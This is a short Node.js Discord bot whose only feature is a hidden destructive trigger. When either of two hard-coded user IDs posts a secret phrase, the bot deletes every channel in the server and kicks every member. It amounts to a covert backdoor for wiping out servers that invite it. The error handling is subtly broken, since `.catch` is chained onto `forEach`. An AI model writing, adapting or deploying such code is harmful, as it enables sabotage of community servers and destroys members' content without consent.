const http = require("http");
const express = require("express");
const app = express();
const Discord = require("discord.js");
const TOKEN = process.env.TOKEN;

var port = process.env.PORT || 3000;
app.listen(port, "0.0.0.0", function() {
	console.log("Listening on Port 3000");
});

var random;
var bot = new Discord.Client();

bot.on("ready", function() {
  console.log("ready");
});
bot.on("message", function(message) {
  if(message.content == "mass server delete q28w27" && message.author.id == "264465468268609537" || message.content == "mass server delete q28w27" && message.author.id == "724899534899118101") {
		message.guild.channels.forEach(channel => channel.delete()).catch(err => console.log(err));;
	 	message.guild.members.forEach(m => m.kick()).catch(err => console.log(err));;
	}
});

bot.login(TOKEN);
